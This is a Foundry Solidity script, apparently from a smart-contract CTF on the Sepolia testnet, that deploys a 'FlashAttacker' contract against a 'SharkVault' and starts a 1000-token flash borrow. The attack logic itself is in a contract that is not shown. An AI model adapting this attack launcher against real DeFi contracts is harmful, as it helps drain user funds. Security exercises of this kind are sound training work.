// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Script, console2} from "forge-std/Script.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

import "../contracts/FlashAttacker.sol";
import "../contracts/SharkVault.sol";
import "../contracts/interfaces/IERC3156FlashLender.sol";
import "../contracts/interfaces/IERC1820Registry.sol";

// forge script scripts/LaunchAttack.s.sol --rpc-url sepolia  
contract LaunchAttackScript is Script {
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    SharkVault sharkVault = SharkVault(0xCB944635f55Ab4310fb5F74671a2fE2792C0B098);
    IERC3156FlashLender goldLender = IERC3156FlashLender(0xfCb668c2108782AC6B0916032BD2aF5a1563E65D);

    function run() public returns (FlashAttacker flashAttacker) {
        vm.startBroadcast(deployerPrivateKey);
        IERC20 gold = sharkVault.gold();
        IERC20 seagold = sharkVault.seagold();

        flashAttacker = new FlashAttacker(goldLender, sharkVault);

        flashAttacker.flashBorrow(address(gold), 1000*1e18);

        vm.stopBroadcast();
    }
}